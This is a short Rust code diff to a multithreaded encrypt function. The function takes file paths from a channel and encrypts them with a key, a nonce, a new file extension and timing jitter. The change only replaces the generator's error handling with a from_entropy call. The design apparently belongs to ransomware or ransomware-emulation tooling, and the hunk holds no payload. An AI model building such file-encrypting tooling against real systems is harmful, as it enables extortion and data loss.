@@ -25,16 +25,9 @@ const ANALYSIS_FILENAME: &str = "analysis.txt";
 pub fn encrypt(r: Receiver<Arc<PathBuf>>,s: Sender<Arc<PathBuf>>, key: Arc<[u8; 32]>, nonce_mutex: Arc<Mutex<[u8; 12]>>, encrypted_extension: Arc<String>, wait_time: Arc<u32>, jitter_time: Arc<u32>) -> thread::JoinHandle<()> {
     debug!("Starting encryption crypto thread");
     thread::spawn(move || {
-        let mut rng_cheap = match SmallRng::from_rng(ThreadRng::default()) {
-            Ok(rng_cheap_result) => {
-                debug!("Succcessfully created cheap random number generator");
-                rng_cheap_result
-            },
-            Err(rng_cheap_result) => {
-                error!("Failed to create cheap random number generator: {}", rng_cheap_result);
-                return
-            },
-        };
+        let mut rng_cheap =  SmallRng::from_entropy();
+        debug!("Created cheap random number generator");
+
         loop {
             let file_path = match r.recv() {
                 Ok(file_path_result) => {
